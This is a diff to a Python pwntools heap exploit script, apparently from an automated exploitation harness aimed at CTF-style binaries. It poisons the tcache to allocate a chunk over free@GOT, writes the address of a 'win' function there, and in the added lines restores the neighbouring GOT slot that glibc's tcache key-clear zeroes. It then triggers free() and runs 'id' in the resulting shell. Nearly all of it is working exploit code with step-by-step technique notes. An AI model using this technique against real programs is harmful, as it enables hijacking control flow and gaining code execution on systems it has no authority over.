@@ -68,6 +68,16 @@ win = (elf.symbols or {}).get("win")
 free_got = (elf.got or {}).get("free")
 if not win or not free_got:
     print("NOT_APPLICABLE (no win / no free@GOT)"); sys.exit(1)
+# glibc's tcache double-free mitigation writes e->key = 0 at chunk+8 for every allocation. When
+# we malloc free@GOT as a chunk, that zeroes the ADJACENT GOT slot (free@GOT+8) -- and `win`
+# typically calls a libc function (puts) through that very slot, so it would jump to NULL. We
+# repair it: read the neighbor's file-initial value (its lazy PLT resolver stub, valid for any
+# JUMP_SLOT on a partial-RELRO non-PIE binary) and write it back in the same overwrite.
+neigh = free_got + 8
+try:
+    neigh_lazy = u64(elf.read(neigh, 8))     # initial GOT value from the ELF image = PLT stub
+except Exception:
+    neigh_lazy = 0
 PROMPT = b"> "
 def choose(io, c, idx=None, data=None):
     io.sendlineafter(PROMPT, str(c).encode())
@@ -103,7 +113,9 @@ try:
             choose(io, 4, 3); pre = u64(io.recv(8).ljust(8, b"\x00"))
         except Exception:
             pass
-        choose(io, 3, 3, p64(win)); stage = "wrote_win"; dbg += drain()   # *free@GOT = win (8 bytes)
+        # *free@GOT = win AND restore free@GOT+8 (zeroed by the tcache key-clear on malloc2), so
+        # win's first libc call (e.g. puts) resolves instead of jumping to NULL.
+        choose(io, 3, 3, p64(win) + p64(neigh_lazy)); stage = "wrote_win"; dbg += drain()
         io.sendlineafter(PROMPT, b"2"); io.sendline(b"2")           # free(2) -> free@GOT -> win()
         stage = "triggered"; dbg += b" free_ptr_pre=%#x " % pre; dbg += io.recvrepeat(1.5)
         io.sendline(b"echo BINORACLE_PWNED; id"); dbg += io.recvrepeat(1.5)
